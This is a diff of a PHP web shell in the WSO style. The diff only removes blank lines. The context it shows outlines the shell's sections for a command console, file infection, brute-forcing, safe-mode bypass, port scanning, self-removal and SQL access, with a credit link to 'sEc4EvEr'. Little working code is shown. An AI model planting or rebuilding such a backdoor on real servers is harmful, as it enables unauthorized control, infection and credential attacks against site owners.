@@ -53,7 +53,6 @@ if( $os == 'win') {
 }
 if( $cwd[strlen($cwd)-1] != '/' )
 	$cwd .= '/';
-
 function printHeader() {
 	if(empty($_POST['charset']))
 		$_POST['charset'] = "UTF-8";
@@ -302,7 +301,6 @@ function which($p) {
 		return $path;
 	return false;
 }
-
 // Sec. Info go --------------------
 function actionSecInfo() {
 	printHeader();
@@ -372,7 +370,6 @@ function actionSecInfo() {
 	printFooter();
 }
 // Sec. Info end --------------------
-
 // File tools go -----------------------
 function actionFilesTools() {
 	if( isset($_POST['p1']) )
@@ -526,7 +523,6 @@ function actionFilesTools() {
 	printFooter();
 }
 // File tools end ----------------------
-
 // Console go --------------------
 if($os == 'win')
 	$aliases = array(
@@ -656,7 +652,6 @@ function add(cmd) {
 	printFooter();
 }
 // Console end --------------------
-
 // PHP -----------------------
 function actionPhp() {
 	if( isset($_POST['ajax']) ) {
@@ -694,7 +689,6 @@ function actionPhp() {
 	printFooter();
 }
 // PHP end --------------------
-
 // File manager go --------------------
 function actionFilesMan() {
 	printHeader();
@@ -850,7 +844,6 @@ function actionFilesMan() {
 	printFooter();
 }
 // File manager end --------------------
-
 // String tools go --------------------
 function actionStringTools() {
 	if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
@@ -941,7 +934,6 @@ function actionStringTools() {
 	printFooter();
 }
 // String tools end --------------------
-
 // Safe mode go ------------------------
 function actionSafeMode() {
 	$temp='';
@@ -996,14 +988,12 @@ function actionSafeMode() {
 	printFooter();
 }
 // Safe mode end ---------------------
-
 // Logout go -------------------------
 function actionLogout() {
 	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
 	echo 'bye!';
 }
 // Logout end -------------------------
-
 // Suicide go -------------------------
 function actionSelfRemove() {
 	printHeader();
@@ -1017,13 +1007,11 @@ function actionSelfRemove() {
 	printFooter();
 }
 // Suicide end -------------------------
-
 function actionTools() {
 	printHeader();
 	
 		printFooter();
 }
-
 // Domains go -------------------------
 function actionDomains() {
 	printHeader();
@@ -1056,7 +1044,6 @@ href='http://wWw.sEc4EvEr.CoM/'>wWw.sEc4EvEr.CoM</a><br>
 	printFooter();
 }
 // Domains end -----------------------
-
 // Infect go -------------------------
 function actionInfect() {
 	printHeader();
@@ -1098,7 +1085,6 @@ function actionInfect() {
 	printFooter();
 }
 // Infect end -----------------------
-
 // Bruteforce go --------------------
 function actionBruteforce() {
 	printHeader();
@@ -1184,7 +1170,6 @@ function actionBruteforce() {
 	printFooter();
 }
 // Bruteforce end --------------------
-
 // Sql go ----------------------------
 function actionSql() {
 	class DbClass {
@@ -1469,7 +1454,6 @@ function actionSql() {
 	printFooter();
 }
 // Sql end -------------------------
-
 // Network go --------------------
 function actionNetwork() {
 	printHeader();
@@ -1525,7 +1509,6 @@ function actionNetwork() {
 	printFooter();
 }
 // Network end --------------------
-
 // Port Scanner go --------------------
 function actionPortScanner() {
     printHeader();
@@ -1558,7 +1541,6 @@ function actionPortScanner() {
     printFooter();    
 }
 // Port Scanner end --------------------
-
 if( empty($_POST['a']) )
 	if(isset($default_action) && function_exists('action' . $default_action))
 		$_POST['a'] = $default_action;
